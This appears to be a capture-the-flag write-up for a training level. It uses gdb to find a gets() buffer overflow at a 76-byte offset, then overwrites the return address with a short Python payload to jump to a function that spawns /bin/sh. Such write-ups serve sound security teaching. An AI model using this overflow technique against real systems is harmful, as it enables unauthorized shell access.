# Level 1

first we check the escutable file we found our binary wait an input and exit the program.

we use gdb to disassemble the main function and that what we got:

```c
Dump of assembler code for function main:
   0x08048480 <+0>:	push   ebp
   0x08048481 <+1>:	mov    ebp,esp
   0x08048483 <+3>:	and    esp,0xfffffff0
   0x08048486 <+6>:	sub    esp,0x50
   0x08048489 <+9>:	lea    eax,[esp+0x10]
   0x0804848d <+13>:	mov    DWORD PTR [esp],eax
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave
   0x08048496 <+22>:	ret
End of assembler dump.
```

in the line <+16> they call the [gets](https://linux.die.net/man/3/gets) function.

## Bugs

**Never use gets(). Because it is impossible to tell without knowing the data in advance how many characters getss() will read, and because gets() will continue to store characters past the end of the buffer, it is extremely dangerous to use. It has been used to break computer security. Use fgets() instead.**

we assume that's a BufferOverFlow vulnerability then we try to give it a long chaine of character, we got a segFault.

```c
(gdb) run
Starting program: /home/user/level1/level1
aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppaaaabbbbcccczzzz

Program received signal SIGSEGV, Segmentation fault.
0x7a7a7a7a in ?? ()
(gdb)
```

chr(0x7a7a7a7a) = zzzz

we found that after 76 characters we got a segfault.

Now we need to find a way to redirect the return address to get the bash.

after runing **infos functions** :

```c
Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
0x0804854c  _fini
```

## **Run Function:**

```c
Dump of assembler code for function run:
   0x08048444 <+0>:	push   ebp
   0x08048445 <+1>:	mov    ebp,esp
   0x08048447 <+3>:	sub    esp,0x18
   0x0804844a <+6>:	mov    eax,ds:0x80497c0
   0x0804844f <+11>:	mov    edx,eax
   0x08048451 <+13>:	mov    eax,0x8048570
   0x08048456 <+18>:	mov    DWORD PTR [esp+0xc],edx
   0x0804845a <+22>:	mov    DWORD PTR [esp+0x8],0x13
   0x08048462 <+30>:	mov    DWORD PTR [esp+0x4],0x1
   0x0804846a <+38>:	mov    DWORD PTR [esp],eax
   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:	mov    DWORD PTR [esp],0x8048584
   0x08048479 <+53>:	call   0x8048360 <system@plt>
   0x0804847e <+58>:	leave
   0x0804847f <+59>:	ret
End of assembler dump.
```

in Line <+53> they call system we check the address 0x8048584 and we got: system("/bin/sh")

```
(gdb) x/s 0x8048584
0x8048584:	 "/bin/sh"
```

now we must use the Run Function address instead of the return address so we use this python program

```python
padding = "A"*76
returnAddr = "\x44\x84\x04\x08"
print padding+returnAddr
```

we save the output of this program in file (tmp) and we passe this file like this:

> cat tmp - | ./level1

Here is an example of a C program that can be used to test the endianness of a system:

```c
#include <stdio.h>
#include <stdint.h>

int main() {
  uint32_t value = 0x12345678;
  uint8_t *ptr = (uint8_t *)&value;

  if (*ptr == 0x78) {
    printf("Little-endian\n");
  } else {
    printf("Big-endian\n");
  }

  return 0;
}

```
